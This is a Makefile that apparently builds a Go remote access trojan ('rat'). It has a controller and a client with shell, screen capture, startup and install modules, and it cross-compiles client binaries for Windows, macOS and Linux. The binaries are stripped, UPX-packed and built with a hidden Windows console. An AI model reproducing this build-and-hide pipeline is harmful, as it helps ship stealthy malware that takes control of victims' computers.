GCFLAGS=-gcflags="-trimpath=$(GOPATH)\src"

BUILD=CGO_ENABLED=1 go build
LDFLAGS=-ldflags="-w -s"

DEFAULT=$(BUILD) $(GCFLAGS)
PROD=$(BUILD) $(GCFLAGS) $(LDFLAGS) --tags="prod"
PROD_WIN32=$(BUILD) $(GCFLAGS) -ldflags="-w -s -H windowsgui" --tags="prod"

LIB=command/web/static/lib.js
UPX=-upx -9

ifdef SYSTEMROOT # windows
	EXT=.exe
else
	EXT=.bin
endif

default: web client
	cd command && $(DEFAULT) -o ../command$(EXT)

client:
	cd client && $(DEFAULT) -o ../client$(EXT)

web:
	-tsc

ugly: web
	-uglifyjs --compress --mangle -o $(LIB) -- $(LIB)

cert:
	cd command && openssl genrsa -out private.key 1024
	cd command && openssl req -new -x509 -key private.key -out cert.pem -days 365

controller: web ugly
	cd command && $(PROD) -o ../command$(EXT)
	$(UPX) command$(EXT)

windows:
	# controller
	cd command && GOOS=windows GOARCH=amd64 $(PROD_WIN32) -o command.exe
	$(UPX) command/command.exe

	# windows x64
	cd client && GOOS=windows GOARCH=amd64 $(PROD_WIN32) -o ../command/bin/windows_amd64.exe
	$(UPX) command/bin/windows_amd64.exe

	# windows x86
	cd client && GOOS=windows GOARCH=386 $(PROD_WIN32) -o ../command/bin/windows_x86.exe
	$(UPX) command/bin/windows_x86.exe

macos:
	# controller
	cd command && GOOS=darwin && GOARCH=amd64 $(PROD) -o command_macos
	$(UPX) command/command_macos

	# client x64s
	cd client && GOOS=darwin GOARCH=amd64 $(PROD) -o ../command/bin/macos_amd64
	$(UPX) command/bin/macos_amd64

linux:
	# controller
	cd command && GOOS=linux GOARCH=amd64 $(PROD) -o command_linux
	$(UPX) command/command_linux

	# client x64
	cd client && GOOS=linux GOARCH=amd64 $(PROD) -o ../command/bin/linux_amd64
	$(UPX) command/bin/linux_amd64

	# client x86
	cd client && GOOS=linux GOARCH=386 $(PROD) -o ../command/bin/linux_x86
	$(UPX) command/bin/linux_x86

prod:
	rm -rf prod
	mkdir prod
	cp command/GeoLite2-Country.mmdb prod/
	cp command/config.json prod/
	mkdir prod/bin
	cp command/bin/* prod/bin/
	mkdir prod/web
	cp command/web/*.template.html prod/web/
	cp -R command/web/static prod/web
	cp command/bin/* prod/bin/
	cp command/command* prod/

fakebin:
	touch command/bin/windows_amd64.exe
	touch command/bin/windows_x86.exe
	touch command/bin/macos_amd64
	touch command/bin/linux_amd64
	touch command/bin/linux_x86

test:
	go test \
	rat/shared/network \
	rat/shared/crypto \
	rat/command \
	rat/client \
	rat/client/computer \
	rat/client/drives \
	rat/client/install \
	rat/client/process \
	rat/client/shell \
	rat/client/startup \
	rat/client/screen \
	rat/client/windows

clean:
	cd client/screen/ && rm -f *.bmp *.jpg
	rm -f debug.bmp
	rm -f *.exe *.bin
	rm -f command/command client/client command/command.exe client/client.exe
	rm -f command/debug client/debug
	rm -f command/bin/*
	rm -f rat
	rm -f command/web/static/lib.js command/web/static/lib.js.map

.PHONY: client